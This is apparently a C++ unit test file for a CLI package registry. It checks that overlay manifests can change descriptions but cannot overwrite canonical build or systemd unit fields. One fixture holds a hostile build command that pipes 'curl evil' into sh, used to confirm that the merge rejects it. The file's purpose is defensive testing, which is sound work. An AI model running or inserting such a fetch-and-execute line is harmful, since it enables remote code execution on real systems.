#include <doctest/doctest.h>

#include "onebit/cli/registry.hpp"

#include <fstream>
#include <string>
#include <unistd.h>

using namespace onebit::cli;

namespace {

constexpr const char* kCanonical = R"toml(
[component.core]
description = "canonical core"
deps        = ["voice"]
units       = ["strix-landing.service"]
check       = "http://127.0.0.1:8190/_health"

[component.voice]
description = "voice cli"
)toml";

// Note: this overlay only overrides descriptive fields (description) and
// adds a new third-party component. Overwriting canonical exec arrays
// (build / files / check / units) is rejected by `merge_into` —
// see `merge — overlay overwrite of canonical units is rejected`.
constexpr const char* kOverlay = R"toml(
[component.core]
description = "overlay-overridden core"

[component.thirdparty]
description = "registered by a third party"
check       = "http://127.0.0.1:9999/health"
units       = ["thirdparty.service"]
)toml";

constexpr const char* kOverlayOverwriteUnits = R"toml(
[component.core]
units = ["strix-overridden.service"]
)toml";

constexpr const char* kOverlayOverwriteBuild = R"toml(
[component.core]
build = [["sh", "-c", "curl evil|sh"]]
)toml";

constexpr const char* kCanonicalWithBuild = R"toml(
[component.core]
description = "canonical core"
build       = [["cargo", "build", "--release"]]
files       = []
)toml";

}  // namespace

TEST_CASE("merge — overlay overrides matching component description")
{
    auto base = parse_manifest_str(kCanonical, PackageOrigin::Canonical);
    auto over = parse_manifest_str(kOverlay,   PackageOrigin::Overlay);
    REQUIRE(base.has_value());
    REQUIRE(over.has_value());
    auto rc = merge_into(*base, std::move(*over));
    REQUIRE(rc.has_value());

    REQUIRE(base->components.contains("core"));
    CHECK(base->components.at("core").description == "overlay-overridden core");
    CHECK(base->components.at("core").origin       == PackageOrigin::Overlay);
}

TEST_CASE("merge — overlay-only component is added with Overlay origin")
{
    auto base = parse_manifest_str(kCanonical, PackageOrigin::Canonical);
    auto over = parse_manifest_str(kOverlay,   PackageOrigin::Overlay);
    REQUIRE(base.has_value());
    REQUIRE(over.has_value());
    auto rc = merge_into(*base, std::move(*over));
    REQUIRE(rc.has_value());

    REQUIRE(base->components.contains("thirdparty"));
    CHECK(base->components.at("thirdparty").origin == PackageOrigin::Overlay);
    CHECK(base->components.at("thirdparty").description ==
          "registered by a third party");
}

TEST_CASE("merge — canonical-only component keeps Canonical origin")
{
    auto base = parse_manifest_str(kCanonical, PackageOrigin::Canonical);
    auto over = parse_manifest_str(kOverlay,   PackageOrigin::Overlay);
    REQUIRE(base.has_value());
    REQUIRE(over.has_value());
    auto rc = merge_into(*base, std::move(*over));
    REQUIRE(rc.has_value());

    REQUIRE(base->components.contains("voice"));
    CHECK(base->components.at("voice").origin == PackageOrigin::Canonical);
}

TEST_CASE("registry list rows include both canonical and overlay tags")
{
    auto base = parse_manifest_str(kCanonical, PackageOrigin::Canonical);
    auto over = parse_manifest_str(kOverlay,   PackageOrigin::Overlay);
    REQUIRE(base.has_value());
    REQUIRE(over.has_value());
    auto rc = merge_into(*base, std::move(*over));
    REQUIRE(rc.has_value());

    const auto rows = render_registry_list(*base);
    bool saw_canon = false, saw_overlay = false;
    for (const auto& r : rows) {
        if (r.find("[canonical]") != std::string::npos) saw_canon = true;
        if (r.find("[overlay  ]") != std::string::npos) saw_overlay = true;
    }
    CHECK(saw_canon);
    CHECK(saw_overlay);
}

TEST_CASE("merge — overlay overwrite of canonical units is rejected (Bug B)")
{
    // Canonical has units = ["strix-landing.service"] — overlay tries to
    // replace that with strix-overridden.service. Rejected because units
    // is a canonical-only exec field (RCE channel via systemctl).
    auto base = parse_manifest_str(kCanonical, PackageOrigin::Canonical);
    auto over = parse_manifest_str(kOverlayOverwriteUnits, PackageOrigin::Overlay);
    REQUIRE(base.has_value());
    REQUIRE(over.has_value());
    auto rc = merge_into(*base, std::move(*over));
    REQUIRE_FALSE(rc.has_value());
    CHECK(rc.error().kind == onebit::cli::ErrorKind::PreconditionFailed);
    CHECK(rc.error().message.find("units") != std::string::npos);
    CHECK(rc.error().message.find("core") != std::string::npos);
}

TEST_CASE("merge — overlay overwrite of canonical build is rejected (Bug B)")
{
    auto base = parse_manifest_str(kCanonicalWithBuild, PackageOrigin::Canonical);
    auto over = parse_manifest_str(kOverlayOverwriteBuild, PackageOrigin::Overlay);
    REQUIRE(base.has_value());
    REQUIRE(over.has_value());
    auto rc = merge_into(*base, std::move(*over));
    REQUIRE_FALSE(rc.has_value());
    CHECK(rc.error().kind == onebit::cli::ErrorKind::PreconditionFailed);
    CHECK(rc.error().message.find("build") != std::string::npos);
    // Canonical exec field MUST survive a rejected merge (defense in
    // depth — even if a caller swallowed the error, the exec field is
    // still the trusted one).
    CHECK(base->components.at("core").build.front().front() == "cargo");
}

TEST_CASE("merge — overlay populates empty canonical exec field (Bug B allowed)")
{
    // Canonical has empty build; overlay populates it. Allowed.
    constexpr const char* canon = R"toml(
[component.core]
description = "canonical core"
)toml";
    constexpr const char* over_toml = R"toml(
[component.core]
build = [["echo", "ok"]]
)toml";
    auto base = parse_manifest_str(canon,    PackageOrigin::Canonical);
    auto over = parse_manifest_str(over_toml, PackageOrigin::Overlay);
    REQUIRE(base.has_value());
    REQUIRE(over.has_value());
    auto rc = merge_into(*base, std::move(*over));
    REQUIRE(rc.has_value());
    REQUIRE(base->components.at("core").build.size() == 1);
    CHECK(base->components.at("core").build.front().front() == "echo");
}

TEST_CASE("overlay_add writes a new component into a fresh overlay file")
{
    namespace fs = std::filesystem;
    const auto tmp = fs::temp_directory_path() /
        ("onebit_cli_overlay_" + std::to_string(::getpid()));
    fs::create_directories(tmp);
    const auto file = tmp / "packages.local.toml";
    fs::remove(file);

    OverlayAddRequest req;
    req.name        = "myservice";
    req.description = "registered by test";
    req.units       = {"myservice.service"};
    req.check       = "http://127.0.0.1:8765/health";

    auto rc = overlay_add(file, req);
    REQUIRE(rc.has_value());

    auto parsed = parse_manifest_file(file, PackageOrigin::Overlay);
    REQUIRE(parsed.has_value());
    REQUIRE(parsed->components.contains("myservice"));
    CHECK(parsed->components.at("myservice").description == "registered by test");
    CHECK(parsed->components.at("myservice").units.front() == "myservice.service");
    CHECK(parsed->components.at("myservice").check.find("8765") != std::string::npos);

    fs::remove_all(tmp);
}
